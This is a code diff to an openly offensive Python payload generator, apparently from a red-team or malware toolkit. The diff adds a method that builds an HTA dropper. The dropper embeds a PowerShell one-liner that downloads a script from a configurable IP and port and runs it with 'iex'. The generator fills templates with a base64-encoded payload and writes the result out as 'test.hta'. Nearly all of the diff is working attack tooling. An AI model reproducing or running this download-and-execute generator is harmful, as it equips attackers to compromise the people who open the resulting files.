@@ -51,6 +51,15 @@ class mypayloadgen():
         self.__gtojs_injection_target_tag = r"%%TARGETPS%%"
         self.__gtojs_injection_target = "notepad.exe"
 
+        self.__pexec_hta_template = "pslauncher.hta"
+        self.__pexec_hta_outputname = "test.hta"
+        self.__pexec_hta_payload_tag = r"%%PAYLOAD%%"
+        self.__pexec_oneliner_template = "Invoke-psonliner.ps1"
+        self.__pexec_oneliner_webrequest = "iex ((New-Object Net.WebClient).DownloadString('http://{}:{}/{}'));Invoke-myclient"
+        self.__pexec_hta_filename = "Invoke-myclient.ps1"
+        self.__pexec_oneliner_ip = "127.0.0.1"
+        self.__pexec_oneliner_port = 80
+        self.__pexec_oneliner_payload_tag = r"%%PAYLOAD%%"
 
 
 
@@ -65,6 +74,42 @@ class mypayloadgen():
 
     def set_injection_target(self,target):
         self.__gtojs_injection_target = target
+    
+
+    def set_pexec_config(self,filename,ip,port):
+        if len(filename) != 0:
+            self.__pexec_hta_filename = filename
+        if len(ip) !=0:        
+            self.__pexec_oneliner_ip = ip
+        if len(port) != 0:
+            self.__pexec_oneliner_port = int(port)
+
+
+    def gen_pexec_hta(self): #hta using powershell loader
+        mycwd = os.path.join(self.__parentdir,self.__to_client)
+        #regen exe first
+        subprocess.run(["build.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        #pre-compile config
+        subprocess.run(["conf-pexec-hta.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__pexec_oneliner_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_tools,self.__pexec_oneliner_template),mode='w') as f:
+            f.write(all_of_it.replace(self.__pexec_oneliner_payload_tag,self.__pexec_oneliner_webrequest.format(self.__pexec_oneliner_ip,self.__pexec_oneliner_port,self.__pexec_hta_filename)))
+
+        output = subprocess.run(["genpexec-hta.bat"], capture_output=True, shell=True, cwd=mycwd)
+        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF
+
+        print(myb64)
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__pexec_hta_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_payload,self.__pexec_hta_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__pexec_hta_payload_tag,myb64))
+
 
     def gen_gtojs(self):
         mycwd = os.path.join(self.__parentdir,self.__to_client)
